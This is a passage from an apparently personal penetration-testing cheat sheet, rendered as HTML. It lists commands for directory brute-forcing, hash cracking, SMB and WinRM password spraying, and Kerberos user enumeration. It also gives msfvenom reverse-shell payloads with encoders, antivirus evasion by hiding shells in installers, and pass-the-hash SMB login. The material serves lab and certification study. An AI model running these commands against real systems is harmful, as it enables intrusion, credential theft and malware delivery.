</span><span id="__span-14-42"><a id="__codelineno-14-42" name="__codelineno-14-42" href="#__codelineno-14-42"></a><span class="c1"># Try to add {GOBUSTER}/ pattern because sometimes ip/cgi-bin results 404 and ip/cgi-bin/ results in 403</span>
</span><span id="__span-14-43"><a id="__codelineno-14-43" name="__codelineno-14-43" href="#__codelineno-14-43"></a><span class="c1"># pattern file can consists entries like {GOBUSTER}/v1</span>
</span><span id="__span-14-44"><a id="__codelineno-14-44" name="__codelineno-14-44" href="#__codelineno-14-44"></a>
</span><span id="__span-14-45"><a id="__codelineno-14-45" name="__codelineno-14-45" href="#__codelineno-14-45"></a>feroxbuster<span class="w"> </span>--url<span class="w"> </span>http://192.168.175.46/<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<span class="w"> </span>-x<span class="w"> </span>php,html
</span><span id="__span-14-46"><a id="__codelineno-14-46" name="__codelineno-14-46" href="#__codelineno-14-46"></a>
</span><span id="__span-14-47"><a id="__codelineno-14-47" name="__codelineno-14-47" href="#__codelineno-14-47"></a>
</span><span id="__span-14-48"><a id="__codelineno-14-48" name="__codelineno-14-48" href="#__codelineno-14-48"></a>gobuster<span class="w"> </span>vhost<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;http://10.10.148.4&quot;</span><span class="w"> </span>--domain<span class="w"> </span>example.thm<span class="w"> </span>-w<span class="w"> </span>/usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span>--append-domain<span class="w"> </span>--exclude-length<span class="w"> </span><span class="m">250</span>-320<span class="w"> </span>
</span><span id="__span-14-49"><a id="__codelineno-14-49" name="__codelineno-14-49" href="#__codelineno-14-49"></a>
</span><span id="__span-14-50"><a id="__codelineno-14-50" name="__codelineno-14-50" href="#__codelineno-14-50"></a>
</span><span id="__span-14-51"><a id="__codelineno-14-51" name="__codelineno-14-51" href="#__codelineno-14-51"></a><span class="c1">## JOHN</span>
</span><span id="__span-14-52"><a id="__codelineno-14-52" name="__codelineno-14-52" href="#__codelineno-14-52"></a>ls<span class="w"> </span>/usr/bin/*2john<span class="w"> </span>/usr/sbin/*2john
</span><span id="__span-14-53"><a id="__codelineno-14-53" name="__codelineno-14-53" href="#__codelineno-14-53"></a>john<span class="w"> </span>--list<span class="o">=</span>formats<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>
</span><span id="__span-14-54"><a id="__codelineno-14-54" name="__codelineno-14-54" href="#__codelineno-14-54"></a>john<span class="w"> </span>--format<span class="o">=</span>nt<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="c1"># mentioning format is important, somtimes it can throw an error during cracking</span>
</span><span id="__span-14-55"><a id="__codelineno-14-55" name="__codelineno-14-55" href="#__codelineno-14-55"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>ssh.passwords<span class="w"> </span>--rules<span class="o">=</span>sshRules<span class="w"> </span>ssh.hash
</span><span id="__span-14-56"><a id="__codelineno-14-56" name="__codelineno-14-56" href="#__codelineno-14-56"></a><span class="c1"># for external rule file using --config parameter otherwise by default /etc/john/john.conf</span>
</span><span id="__span-14-57"><a id="__codelineno-14-57" name="__codelineno-14-57" href="#__codelineno-14-57"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>rockyou.txt<span class="w"> </span>--rules<span class="o">=</span>MyRules<span class="w"> </span>--config<span class="o">=</span>custom.conf<span class="w"> </span>--format<span class="o">=</span>&lt;hash-format&gt;<span class="w"> </span>&lt;hashfile&gt;
</span><span id="__span-14-58"><a id="__codelineno-14-58" name="__codelineno-14-58" href="#__codelineno-14-58"></a>
</span><span id="__span-14-59"><a id="__codelineno-14-59" name="__codelineno-14-59" href="#__codelineno-14-59"></a>
</span><span id="__span-14-60"><a id="__codelineno-14-60" name="__codelineno-14-60" href="#__codelineno-14-60"></a><span class="c1">## HASHCAT</span>
</span><span id="__span-14-61"><a id="__codelineno-14-61" name="__codelineno-14-61" href="#__codelineno-14-61"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>crackme.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>-r<span class="w"> </span>demo3.rule<span class="w"> </span>--force
</span><span id="__span-14-62"><a id="__codelineno-14-62" name="__codelineno-14-62" href="#__codelineno-14-62"></a>hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">0</span><span class="w"> </span>hash.txt<span class="w"> </span>/usr/share/wordilsts/rockyou.txt<span class="w"> </span>-r<span class="w"> </span>/usr/share/hashcat/rules/rockyou-30000.rule
</span><span id="__span-14-63"><a id="__codelineno-14-63" name="__codelineno-14-63" href="#__codelineno-14-63"></a>
</span><span id="__span-14-64"><a id="__codelineno-14-64" name="__codelineno-14-64" href="#__codelineno-14-64"></a>
</span><span id="__span-14-65"><a id="__codelineno-14-65" name="__codelineno-14-65" href="#__codelineno-14-65"></a><span class="c1">## CRACKMAPEXEC</span>
</span><span id="__span-14-66"><a id="__codelineno-14-66" name="__codelineno-14-66" href="#__codelineno-14-66"></a>crackmapexec<span class="w"> </span>mssql<span class="w"> </span><span class="m">192</span>.168.227.18<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span>test_wordlist.txt<span class="w"> </span>--local-auth
</span><span id="__span-14-67"><a id="__codelineno-14-67" name="__codelineno-14-67" href="#__codelineno-14-67"></a>
</span><span id="__span-14-68"><a id="__codelineno-14-68" name="__codelineno-14-68" href="#__codelineno-14-68"></a>
</span><span id="__span-14-69"><a id="__codelineno-14-69" name="__codelineno-14-69" href="#__codelineno-14-69"></a><span class="c1"># Kerberos user enumeration</span>
</span><span id="__span-14-70"><a id="__codelineno-14-70" name="__codelineno-14-70" href="#__codelineno-14-70"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="o">=</span>krb5-enum-users<span class="w"> </span>--script-args<span class="w"> </span>krb5-enum-users.realm<span class="o">=</span>klay.thm,userdb<span class="o">=</span>/usr/share/wordlists/seclists/Usernames/Names/names.txt<span class="w"> </span>klaycomputer.klay.thm
</span><span id="__span-14-71"><a id="__codelineno-14-71" name="__codelineno-14-71" href="#__codelineno-14-71"></a>kerbrute<span class="w"> </span>userenum<span class="w"> </span>--dc<span class="w"> </span><span class="m">10</span>.10.58.86<span class="w"> </span>-d<span class="w"> </span>klay.thm<span class="w"> </span>/usr/share/seclists/Usernames/Names/names.txt
</span><span id="__span-14-72"><a id="__codelineno-14-72" name="__codelineno-14-72" href="#__codelineno-14-72"></a>
</span><span id="__span-14-73"><a id="__codelineno-14-73" name="__codelineno-14-73" href="#__codelineno-14-73"></a><span class="c1"># SMB bruteforcing</span>
</span><span id="__span-14-74"><a id="__codelineno-14-74" name="__codelineno-14-74" href="#__codelineno-14-74"></a>
</span><span id="__span-14-75"><a id="__codelineno-14-75" name="__codelineno-14-75" href="#__codelineno-14-75"></a>
</span><span id="__span-14-76"><a id="__codelineno-14-76" name="__codelineno-14-76" href="#__codelineno-14-76"></a><span class="c1">## BURPSUITE Options</span>
</span><span id="__span-14-77"><a id="__codelineno-14-77" name="__codelineno-14-77" href="#__codelineno-14-77"></a><span class="c1">## for csrf enabled brute forcing</span>
</span><span id="__span-14-78"><a id="__codelineno-14-78" name="__codelineno-14-78" href="#__codelineno-14-78"></a>Project<span class="w"> </span>options<span class="w"> </span>-&gt;<span class="w"> </span>sessions<span class="w"> </span>-&gt;<span class="w"> </span>add<span class="w"> </span>new<span class="w"> </span>rule<span class="w"> </span>-&gt;<span class="w"> </span>add<span class="w"> </span>macro<span class="w"> </span>
</span><span id="__span-14-79"><a id="__codelineno-14-79" name="__codelineno-14-79" href="#__codelineno-14-79"></a>get<span class="w"> </span>csrf<span class="w"> </span>token<span class="w"> </span>from<span class="w"> </span>login<span class="w"> </span>page<span class="w"> </span><span class="k">then</span><span class="w"> </span>configure<span class="w"> </span>item<span class="w"> </span>and<span class="w"> </span>custom<span class="w"> </span>parameter<span class="w"> </span>location<span class="w"> </span>and<span class="w"> </span>add<span class="w"> </span>parameter<span class="w"> </span>name.
</span><span id="__span-14-80"><a id="__codelineno-14-80" name="__codelineno-14-80" href="#__codelineno-14-80"></a><span class="nb">enable</span><span class="w"> </span>tolerate<span class="w"> </span>url<span class="w"> </span>mismatch<span class="w"> </span>and<span class="w"> </span><span class="nb">set</span><span class="w"> </span>scope<span class="w"> </span>to<span class="w"> </span>intruder<span class="w"> </span>and<span class="w"> </span>repeater
</span><span id="__span-14-81"><a id="__codelineno-14-81" name="__codelineno-14-81" href="#__codelineno-14-81"></a><span class="k">for</span><span class="w"> </span>proper<span class="w"> </span>csrf_token<span class="w"> </span>retrievel<span class="w"> </span><span class="nb">set</span><span class="w"> </span>to<span class="w"> </span>max<span class="w"> </span><span class="nv">concurrent</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span>
</span></code></pre></div></li>
</ul>
</li>
</ul>
<h4 id="wordlist">Wordlist</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="nb">printf</span><span class="w"> </span><span class="s2">&quot;%s\n&quot;</span><span class="w"> </span><span class="m">192</span>.168.237.<span class="o">{</span><span class="m">70</span>..76<span class="o">}</span><span class="w"> </span>&gt;<span class="w"> </span>wordlist.txt
</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a>
</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a>
</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="c1"># Wordlist</span>
</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a><span class="k">while</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="w"> </span><span class="nb">read</span><span class="w"> </span>-r<span class="w"> </span>url<span class="p">;</span><span class="w"> </span><span class="k">do</span>
</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="w">    </span>cewl<span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="s2">&quot;</span><span class="nv">$url</span><span class="s2">&quot;</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>wordlist.txt<span class="w">  </span><span class="c1"># also use --lowercase option,</span>
</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="k">done</span><span class="w"> </span>&lt;<span class="w"> </span>urls.txt
</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a>
</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a>crunch<span class="w"> </span><span class="m">6</span><span class="w"> </span><span class="m">6</span><span class="w"> </span>-t<span class="w"> </span>knownpass%%%<span class="w"> </span>&gt;<span class="w"> </span>wordlist<span class="w">   </span><span class="c1"># % for digits  , for Uppercase  @ lowercase ^ symbols</span>
</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>crunch<span class="w"> </span><span class="m">4</span><span class="w"> </span><span class="m">6</span><span class="w"> </span>abcd123<span class="w"> </span>-o<span class="w"> </span>wordlist.txt<span class="w"> </span><span class="c1"># pass of 4 to 6 characters using charset</span>
</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a>
</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="c1"># wordlist mutation</span>
</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a>hashcat<span class="w"> </span>-r<span class="w"> </span>demo.rule<span class="w"> </span>--stdout<span class="w"> </span>demo.txt<span class="w">  </span><span class="c1"># [All the Rules listed on hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)</span>
</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="c1"># /usr/share/hashcat/rules : more rules provided by hashcat</span>
</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a>
</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="c1"># to use hashcat rules inside john add rule name </span>
</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a><span class="c1"># [List.Rules:sshRules] inside /etc/john/john.conf</span>
</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a>john<span class="w"> </span>--wordlist<span class="o">=</span>test.txt<span class="w"> </span>--rules<span class="w"> </span>--stdout
</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a>
</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="c1"># to transfer rules from hashcat to john</span>
</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="w"> </span><span class="o">(</span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;[List.Rules:best64]&#39;</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/usr/share/hashcat/rules/best64.rule<span class="w"> </span><span class="o">)</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>custom64.conf
</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a>
</span><span id="__span-15-23"><a id="__codelineno-15-23" name="__codelineno-15-23" href="#__codelineno-15-23"></a>cupp<span class="w"> </span>-i
</span><span id="__span-15-24"><a id="__codelineno-15-24" name="__codelineno-15-24" href="#__codelineno-15-24"></a>
</span><span id="__span-15-25"><a id="__codelineno-15-25" name="__codelineno-15-25" href="#__codelineno-15-25"></a>creds<span class="w"> </span>search<span class="w"> </span>&lt;appname&gt;<span class="w"> </span><span class="c1"># for default creds</span>
</span><span id="__span-15-26"><a id="__codelineno-15-26" name="__codelineno-15-26" href="#__codelineno-15-26"></a>
</span><span id="__span-15-27"><a id="__codelineno-15-27" name="__codelineno-15-27" href="#__codelineno-15-27"></a><span class="c1"># username generator</span>
</span><span id="__span-15-28"><a id="__codelineno-15-28" name="__codelineno-15-28" href="#__codelineno-15-28"></a>nano<span class="w"> </span>names.txt<span class="w"> </span><span class="c1"># add full names</span>
</span><span id="__span-15-29"><a id="__codelineno-15-29" name="__codelineno-15-29" href="#__codelineno-15-29"></a>awk<span class="w"> </span><span class="s1">&#39;{print $2, $1}&#39;</span><span class="w"> </span>names.txt<span class="w"> </span>&gt;&gt;<span class="w"> </span>names.txt
</span><span id="__span-15-30"><a id="__codelineno-15-30" name="__codelineno-15-30" href="#__codelineno-15-30"></a>username_generator.py<span class="w"> </span>-w<span class="w"> </span>names.txt<span class="w"> </span>-u<span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u<span class="w"> </span>&gt;<span class="w"> </span>usernames.txt
</span></code></pre></div>
<h5 id="some-important-mutation-rules">Some Important Mutation rules</h5>
<ul>
<li>/usr/share/hashcat/rules/rockyou-30000.rule</li>
<li>/usr/share/hashcat/rules/best64.rule</li>
</ul>
<h5 id="some-important-wordlists">Some important wordlists</h5>
<p>Use cewl tool to crawl website specific login creds.
- /usr/share/wordlists/dirb/common.txt 
- /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt
- /usr/share/dirb/wordlists/small.txt
- <strong>/usr/share/wordlists/dirb/others/names.txt</strong>
- /usr/share/seclists/Discovery/Web-Content/directory-list-*
- /usr/share/wordlists/fasttrack.txt
- /usr/share/metasploit-framework/data/wordlists/</p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="c1"># [All the Rules listed on hashcat](https://hashcat.net/wiki/doku.php?id=rule_based_attack)</span>
</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>:<span class="w"> </span><span class="c1"># no rule apply</span>
</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="nv">$1</span><span class="w"> </span>c<span class="w"> </span><span class="nv">$!</span><span class="w">    </span><span class="c1"># hashcat rule content, ends with 1! and capitalize 1st character Most common one</span>
</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="nv">$!</span><span class="w"> </span>c<span class="w"> </span><span class="nv">$1</span>
</span><span id="__span-16-6"><a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="nv">$1</span><span class="w"> </span><span class="nv">$2</span><span class="w"> </span><span class="nv">$3</span><span class="w"> </span>c<span class="w"> </span><span class="nv">$!</span>
</span><span id="__span-16-7"><a id="__codelineno-16-7" name="__codelineno-16-7" href="#__codelineno-16-7"></a><span class="nv">$1</span><span class="w"> </span><span class="nv">$2</span><span class="w"> </span><span class="nv">$3</span><span class="w"> </span>c<span class="w"> </span><span class="nv">$@</span>
</span><span id="__span-16-8"><a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="nv">$1</span><span class="w"> </span><span class="nv">$2</span><span class="w"> </span><span class="nv">$3</span><span class="w"> </span>c<span class="w"> </span><span class="nv">$#</span>
</span><span id="__span-16-9"><a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="nv">$1</span><span class="w"> </span><span class="nv">$2</span><span class="w"> </span><span class="nv">$3</span><span class="w"> </span>c<span class="w"> </span><span class="nv">$!</span>
</span><span id="__span-16-10"><a id="__codelineno-16-10" name="__codelineno-16-10" href="#__codelineno-16-10"></a>
</span><span id="__span-16-11"><a id="__codelineno-16-11" name="__codelineno-16-11" href="#__codelineno-16-11"></a><span class="c1"># Also check other users password in order to get an idea of rules</span>
</span><span id="__span-16-12"><a id="__codelineno-16-12" name="__codelineno-16-12" href="#__codelineno-16-12"></a>strings<span class="w"> </span>-n<span class="w"> </span><span class="m">7</span><span class="w">  </span><span class="c1"># to filter out minimum length password from wordlits</span>
</span><span id="__span-16-13"><a id="__codelineno-16-13" name="__codelineno-16-13" href="#__codelineno-16-13"></a><span class="c1"># using the rule fiel</span>
</span><span id="__span-16-14"><a id="__codelineno-16-14" name="__codelineno-16-14" href="#__codelineno-16-14"></a>hashcat<span class="w"> </span>-r<span class="w"> </span>demo.rule<span class="w"> </span>--stdout<span class="w"> </span>demo.txt
</span></code></pre></div>
<h3 id="exploitation">💥Exploitation</h3>
<h4 id="payload-creation">Payload Creation</h4>
<p>Check All The Payload Code: [[Code &amp; Exploit Cheatsheet#Victim Machine Payloads]]
<div class="language-shell highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="c1"># cross compilation</span>
</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>x86_64-w64-mingw32-gcc<span class="w"> </span>windows_service.c<span class="w"> </span>-o<span class="w"> </span>service.exe<span class="w">  </span><span class="c1"># for 64 bit</span>
</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>i686-w64-mingw32-gcc<span class="w"> </span><span class="m">42341</span>.c<span class="w"> </span>-o<span class="w"> </span>syncbreeze_exploit.exe<span class="w">  </span>-lws2_32<span class="w">  </span><span class="c1"># for 32 bit</span>
</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>gcc<span class="w"> </span>-static<span class="w"> </span>-m32<span class="w"> </span>code.c<span class="w"> </span>-o<span class="w"> </span><span class="nb">test</span><span class="w">  </span><span class="c1"># for 32 bit linux</span>
</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>gcc<span class="w"> </span>-static<span class="w"> </span>code.c<span class="w"> </span>-o<span class="w"> </span><span class="nb">test</span><span class="w">  </span><span class="c1"># for cross-compilation </span>
</span><span id="__span-17-6"><a id="__codelineno-17-6" name="__codelineno-17-6" href="#__codelineno-17-6"></a>
</span><span id="__span-17-7"><a id="__codelineno-17-7" name="__codelineno-17-7" href="#__codelineno-17-7"></a>
</span><span id="__span-17-8"><a id="__codelineno-17-8" name="__codelineno-17-8" href="#__codelineno-17-8"></a><span class="c1"># MSF Venom</span>
</span><span id="__span-17-9"><a id="__codelineno-17-9" name="__codelineno-17-9" href="#__codelineno-17-9"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>&gt;<span class="w"> </span>mal_reverse.exe
</span><span id="__span-17-10"><a id="__codelineno-17-10" name="__codelineno-17-10" href="#__codelineno-17-10"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span>&lt;IP&gt;<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span>&lt;PORT&gt;<span class="w"> </span>-f<span class="w"> </span>exe-service<span class="w"> </span>&gt;<span class="w"> </span>mal_service.exe
</span><span id="__span-17-11"><a id="__codelineno-17-11" name="__codelineno-17-11" href="#__codelineno-17-11"></a>
</span><span id="__span-17-12"><a id="__codelineno-17-12" name="__codelineno-17-12" href="#__codelineno-17-12"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.50.4<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span><span class="w"> </span><span class="nv">EXITFUNC</span><span class="o">=</span>thread<span class="w"> </span>-f<span class="w"> </span>c<span class="w"> </span>-e<span class="w"> </span><span class="s2">&quot;x86/shikata_ga_nai&quot;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;\x00\x0a\x0d\x25\x26\x2b\x3d&quot;</span>
</span></code></pre></div></p>
<h4 id="evasion">Evasion</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="c1"># to encode and obfuscate powershell scripts in order to bypass AV</span>
</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>powershell-encoder.py
</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>pwsh&gt;<span class="w"> </span>InvokeStealth.ps1
</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a>
</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a>shellter<span class="w"> </span><span class="c1"># for stealth mode it needs meterpreter shell otherwise it will crash</span>
</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="c1"># Binaries to hide shell within Putty.exe, Spotify installer, sysmon.exe</span>
</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a>
</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a>veil<span class="w"> </span><span class="c1"># generating evasive metasploit payload</span>
</span></code></pre></div>
<h3 id="file-transfer-delivery">🚚File Transfer (Delivery)</h3>
<p><a href="https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/file-transfer-techniques">More file transfer techniques</a></p>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># Python web server</span>
</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>python<span class="w"> </span>-m<span class="w"> </span>http.server
</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="c1"># ftp server</span>
</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>python3<span class="w"> </span>-m<span class="w"> </span>pyftpdlib<span class="w"> </span>-w<span class="w"> </span>-p<span class="w"> </span><span class="m">21</span><span class="w"> </span>-u<span class="w"> </span>ignite<span class="w"> </span>-P<span class="w"> </span><span class="m">123</span><span class="w"> </span><span class="c1"># skip -u -P for anonymous login</span>
</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>
</span><span id="__span-19-7"><a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="c1"># Smb share</span>
</span><span id="__span-19-8"><a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>impacket-smbserver<span class="w"> </span>sharename<span class="w"> </span>/tmp/smbshare<span class="w"> </span>-smb2support<span class="w"> </span>-username<span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="w"> </span>-password<span class="w"> </span><span class="s1">&#39;test&#39;</span><span class="c1"># for no auth -username &#39;&#39; -password &#39;&#39; also set chmod 777 temp  </span>
</span><span id="__span-19-9"><a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>net<span class="w"> </span>user<span class="w"> </span><span class="se">\\</span>ip<span class="se">\s</span>harename<span class="w"> </span>/user:test<span class="w"> </span><span class="nb">test</span><span class="w">  </span><span class="c1"># on windows side</span>
</span><span id="__span-19-10"><a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>
</span><span id="__span-19-11"><a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a><span class="c1"># webdav</span>
</span><span id="__span-19-12"><a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>wsgidav<span class="w"> </span>--host<span class="o">=</span><span class="m">0</span>.0.0.0<span class="w"> </span>--port<span class="o">=</span><span class="m">80</span><span class="w"> </span>--auth<span class="o">=</span>anonymous<span class="w"> </span>--root<span class="w"> </span>/home/kali/webdav/
</span><span id="__span-19-13"><a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>
</span><span id="__span-19-14"><a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>updog<span class="w"> </span>-p<span class="w"> </span><span class="m">8090</span>
</span><span id="__span-19-15"><a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>
</span><span id="__span-19-16"><a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a><span class="c1"># my tool</span>
</span><span id="__span-19-17"><a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>fuzzy-httpserver<span class="w"> </span>-d<span class="w"> </span>/opt/transfers/<span class="w"> </span>-p<span class="w"> </span><span class="m">800</span>
</span></code></pre></div>
<h3 id="initial-access">🚪Initial Access</h3>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>smbclient<span class="w"> </span>//192.168.50.212/secrets<span class="w"> </span>-U<span class="w"> </span>Administrator<span class="w"> </span>--pw-nt-hash<span class="w"> </span>7a38310ea6f0027ee955abed1762964b
</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="c1"># --option=&#39;client min protocol=core&#39; core/NT1/SMB2  to downgrade smb version client to check compatibility</span>
</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="c1"># Certain enumeration features work only in SMB1</span>
</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a>
</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a>netexec<span class="w"> </span>smb<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user.txt<span class="w"> </span>-p<span class="w"> </span>pass.txt<span class="w"> </span>--continue-on-success
</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>netexec<span class="w"> </span>winrm<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user.txt<span class="w"> </span>-p<span class="w"> </span>pass.txt<span class="w"> </span>--continue-on-success
